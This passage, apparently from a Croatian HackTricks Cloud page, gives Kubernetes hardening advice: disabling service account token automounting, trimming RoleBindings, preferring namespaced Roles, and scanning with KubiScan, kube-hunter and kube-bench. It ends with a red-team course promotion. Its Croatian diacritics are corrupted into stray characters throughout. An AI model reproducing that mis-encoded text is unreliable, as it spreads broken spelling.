### **Onemogu캖avanje automatskog montiranja tokena servisnog ra캜una**

- **Podovi i servisni ra캜uni**: Podovi automatski montiraju token servisnog ra캜una. Da biste pobolj코ali sigurnost, Kubernetes omogu캖ava onemogu캖avanje ove funkcije automatskog montiranja.
- **Kako primijeniti**: Postavite `automountServiceAccountToken: false` u konfiguraciji servisnih ra캜una ili podova po캜ev코i od verzije Kubernetesa 1.6.

### **Ograni캜avanje dodjele korisnika u RoleBindings/ClusterRoleBindings**

- **Selektivno uklju캜ivanje**: Provjerite da su u RoleBindings ili ClusterRoleBindings uklju캜eni samo potrebni korisnici. Redovito provjeravajte i uklanjajte nepotrebne korisnike radi odr쬬vanja 캜vrste sigurnosti.

### **Uloge specifi캜ne za imenike umjesto globalnih uloga**

- **Uloge naspram globalnih uloga**: Preporu캜uje se kori코tenje uloga i RoleBindings za dozvole specifi캜ne za imenike umjesto ClusterRoles i ClusterRoleBindings, koji se primjenjuju na cijeli klaster. Ovaj pristup pru쬬 precizniju kontrolu i ograni캜ava opseg dozvola.

### **Koristite automatizirane alate**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Reference**

* **[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)**
* **[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)**
* **[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**


<details>

<summary><strong>Nau캜ite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricksu:

* Ako 쬰lite vidjeti **ogla코avanje va코e tvrtke u HackTricksu** ili **preuzeti HackTricks u PDF formatu**, provjerite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**slu쬭eni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podijelite svoje hakiraju캖e trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorije.

</details>
